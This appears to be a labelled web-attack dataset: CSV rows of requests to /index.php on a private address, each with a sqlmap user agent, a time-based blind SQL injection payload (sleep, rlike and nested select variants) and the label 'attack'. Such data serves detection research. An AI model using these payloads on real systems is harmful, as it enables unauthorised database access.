/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 2130=2130,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 1494=1494,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as fdmp where 8057=8057,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 4683=4683,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and sleep(5)-- mcmg,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and sleep(5) and ('iwya'='iwya,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and sleep(5) and (('whhf'='whhf,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and sleep(5) and ((('lofu'='lofu,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and sleep(5) and 'dxyb'='dxyb,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and sleep(5) and ('xmse' like 'xmse,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and sleep(5) and (('zunv' like 'zunv,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and sleep(5) and 'tgpr' like 'tgpr,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and sleep(5) and ((""nfsp""=""nfsp",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and sleep(5) and (((""uwfa""=""uwfa",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and sleep(5) and ""tfzo""=""tfzo",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and sleep(5) and ((""ealx"" like ""ealx",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and sleep(5) and ""jfxw"" like ""jfxw",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') and sleep(5) and ('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) and sleep(5) and (('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' and sleep(5) and '%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and sleep(5) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 5772=5772 and sleep(5)-- fsyi,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as smom where 6646=6646 and sleep(5)-- dpvh,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) and sleep(5) and (4393=4393,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) and sleep(5) and ((2925=2925,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) and sleep(5) and (((4970=4970,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and sleep(5)# vhqw,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 8722=8722 and sleep(5)-- dpff,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 7101=7101 and sleep(5)-- scfl,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 2245=2245 and sleep(5)-- vwwu,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 9600=9600 and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as csvp where 7934=7934 and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 2728=2728 and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as jogg where 3974=3974 and sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and (select * from (select(sleep(5)))szhi)-- abzm,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and (select * from (select(sleep(5)))szhi)-- imgk,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and (select * from (select(sleep(5)))szhi) and ('rqmk'='rqmk,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and (select * from (select(sleep(5)))szhi) and (('asvg'='asvg,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and (select * from (select(sleep(5)))szhi) and 'vjlq'='vjlq,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and (select * from (select(sleep(5)))szhi) and (('ogoa' like 'ogoa,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and (select * from (select(sleep(5)))szhi) and ((('kwol' like 'kwol,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and (select * from (select(sleep(5)))szhi) and (""xrnj""=""xrnj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and (select * from (select(sleep(5)))szhi) and ((""gtmd""=""gtmd",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and (select * from (select(sleep(5)))szhi) and (((""jiom""=""jiom",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and (select * from (select(sleep(5)))szhi) and ""wpzz""=""wpzz",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and (select * from (select(sleep(5)))szhi) and (""jbhm"" like ""jbhm",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and (select * from (select(sleep(5)))szhi) and ((""vpqh"" like ""vpqh",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') and (select * from (select(sleep(5)))szhi) and ('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) and (select * from (select(sleep(5)))szhi) and (('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' and (select * from (select(sleep(5)))szhi) and '%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and (select * from (select(sleep(5)))szhi) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and (select * from (select(sleep(5)))szhi) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) and (select * from (select(sleep(5)))szhi)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) and (select * from (select(sleep(5)))szhi) and (5617=5617,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and (select * from (select(sleep(5)))szhi)-- lwti,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and (select * from (select(sleep(5)))szhi)# lwnz,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 7369=7369 and (select * from (select(sleep(5)))szhi)-- miax,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 1370=1370 and (select * from (select(sleep(5)))szhi)-- zdzn,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 2401=2401 and (select * from (select(sleep(5)))szhi)-- vdmz,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and (select * from (select(sleep(5)))gdhn)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and (select * from (select(sleep(5)))gdhn)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and (select * from (select(sleep(5)))gdhn)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and (select * from (select(sleep(5)))gdhn)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and (select * from (select(sleep(5)))gdhn)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 4875=4875 and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 8432=8432 and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as zvad where 6835=6835 and (select * from (select(sleep(5)))gdhn)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike sleep(5)-- vbbv,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike sleep(5) and ('oumx'='oumx,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike sleep(5) and ((('ejdd'='ejdd,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike sleep(5) and 'xrde'='xrde,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) rlike sleep(5) and (('iwqc' like 'iwqc,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike sleep(5) and ((('hgrx' like 'hgrx,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike sleep(5) and 'daat' like 'daat,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") rlike sleep(5) and (""ilso""=""ilso",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) rlike sleep(5) and (((""mnve""=""mnve",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") rlike sleep(5) and (""ovon"" like ""ovon",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" rlike sleep(5) and ""ceon"" like ""ceon",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') rlike sleep(5) and ('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) rlike sleep(5) and (('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) rlike sleep(5) and ((('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' rlike sleep(5) and '%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" rlike sleep(5) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 3767=3767 rlike sleep(5)-- jjxj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as xfxa where 9323=9323 rlike sleep(5)-- dpsz,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike sleep(5)-- tgme,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike sleep(5) and (8239=8239,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) rlike sleep(5) and ((8887=8887,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) rlike sleep(5) and (((1867=1867,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike sleep(5),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike sleep(5)-- inao,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike sleep(5)# ddfi,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 6801=6801 rlike sleep(5)-- xjjd,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 9259=9259 rlike sleep(5)-- ffqj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as zpqx where 5831=5831 rlike sleep(5)-- eikj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 2734=2734 rlike sleep(5)-- wequ,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") rlike sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) rlike sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) rlike sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") rlike sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" rlike sleep(5)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 6237=6237 rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as rrfs where 9807=9807 rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 7569=7569 rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 9954=9954 rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as ncfl where 8365=8365 rlike sleep(5)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike (select * from (select(sleep(5)))wboo)-- osgj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select * from (select(sleep(5)))wboo)-- swzi,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) rlike (select * from (select(sleep(5)))wboo) and (('gqam'='gqam,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike (select * from (select(sleep(5)))wboo) and ((('aapl'='aapl,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select * from (select(sleep(5)))wboo) and 'hjqk'='hjqk,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike (select * from (select(sleep(5)))wboo) and ('oxci' like 'oxci,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike (select * from (select(sleep(5)))wboo) and ((('dbjc' like 'dbjc,attack
